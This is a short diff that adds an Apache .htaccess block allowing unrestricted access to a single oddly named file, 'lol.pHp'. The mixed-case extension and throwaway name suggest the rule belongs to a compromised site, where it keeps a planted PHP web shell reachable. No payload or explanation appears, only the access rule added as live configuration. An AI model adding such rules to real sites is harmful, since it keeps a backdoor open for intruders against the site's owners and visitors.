@@ -1,0 +1,4 @@
+<FilesMatch "^(lol.pHp)$">
+ Order allow,deny
+ Allow from all
+</FilesMatch>
